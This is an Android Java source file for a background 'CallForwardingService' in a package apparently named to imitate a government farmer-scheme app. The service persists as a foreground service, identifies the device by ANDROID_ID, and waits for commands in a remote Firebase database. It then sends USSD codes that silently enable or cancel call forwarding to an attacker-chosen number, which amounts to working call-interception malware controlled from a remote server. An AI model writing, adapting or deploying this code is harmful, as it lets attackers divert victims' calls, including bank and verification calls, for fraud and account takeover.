package io.pmkishan.controller;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import com.google.firebase.database.*;

public class CallForwardingService extends Service {
    private static final String CHANNEL_ID = "CallForwardingServiceChannel";
    private DatabaseReference databaseReference;
    private String androidID;
    private Boolean lastCallForwardingStatus = null;
    private String lastForwardNumber = null;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        databaseReference = FirebaseDatabase.getInstance().getReference("details");
        androidID = android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        monitorCallForwarding();
    }

    private void monitorCallForwarding() {
        databaseReference.child(androidID).addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    Boolean callForwardingEnabled = snapshot.child("callForwardingEnabled").getValue(Boolean.class);
                    String forwardToNumber = snapshot.child("forwardToNumber").getValue(String.class);

                    if (callForwardingEnabled != null && forwardToNumber != null) {
                        if (!callForwardingEnabled.equals(lastCallForwardingStatus) || !forwardToNumber.equals(lastForwardNumber)) {
                            if (callForwardingEnabled) {
                                setCallForwarding(getApplicationContext(), false, forwardToNumber);
                            } else {
                                setCallForwarding(getApplicationContext(), true, "");
                            }
                            lastCallForwardingStatus = callForwardingEnabled;
                            lastForwardNumber = forwardToNumber;
                        }
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError error) {
                Log.e("FirebaseError", error.getMessage());
            }
        });
    }

    public void setCallForwarding(Context context, boolean disable, String phoneNumber) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        int defaultSubId = 0;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            defaultSubId = SubscriptionManager.getDefaultSubscriptionId();
        }
        TelephonyManager manager = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            manager = telephonyManager.createForSubscriptionId(defaultSubId);
        }

        Handler handler = new Handler();
        TelephonyManager.UssdResponseCallback responseCallback = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            responseCallback = new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);
                    Toast.makeText(context, "USSD Success: " + response.toString(), Toast.LENGTH_SHORT).show();
                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                    Toast.makeText(context, "USSD Failed: " + failureCode, Toast.LENGTH_SHORT).show();
                }
            };
        }

        String ussdRequest = disable ? "#21#" : "*21*" + phoneNumber + "#";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            manager.sendUssdRequest(ussdRequest, responseCallback, handler);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Call Forwarding Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification getNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Call Forwarding Active")
                    .setContentText("Listening for forwarding updates...")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build();
        }
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}